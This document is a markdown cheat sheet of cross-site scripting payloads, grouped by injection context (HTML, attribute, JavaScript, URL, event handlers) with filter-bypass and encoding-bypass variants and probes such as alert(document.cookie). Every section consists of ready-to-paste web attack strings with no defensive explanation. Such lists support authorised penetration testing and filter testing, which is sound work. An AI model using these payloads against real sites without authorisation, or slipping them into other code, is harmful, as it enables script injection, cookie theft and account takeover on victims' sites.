# XSS Payloads
---

## Basic Detection

```id="b1x9kd"
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

---

## HTML Context

```id="h2k7mz"
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
```

---

## Attribute Context

```id="a4n8qp"
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
" onclick=alert(1)

' onerror=alert(1) x='
' onload=alert(1) x='
```

---

## JavaScript Context

```id="j6r3tw"
';alert(1);//
";alert(1);//

</script><script>alert(1)</script>

'-alert(1)-'
";alert(1);var x="
```

---

## URL Context

```id="u3m7zx"
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## Event Handlers

```id="e9k2vb"
onerror=alert(1)
onload=alert(1)
onclick=alert(1)
onfocus=alert(1)
onmouseover=alert(1)
```

---

## Filter Bypass

```id="f5p8qs"
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<iframe/src=javascript:alert(1)>

<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</script>

<svg><script>alert(1)</script>
```

---

## Encoding Bypass

```id="c7x1dn"
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
```

---

## Common Variations

```id="v8y4rt"
alert(1)
confirm(1)
prompt(1)

alert(document.domain)
alert(document.cookie)
```

---
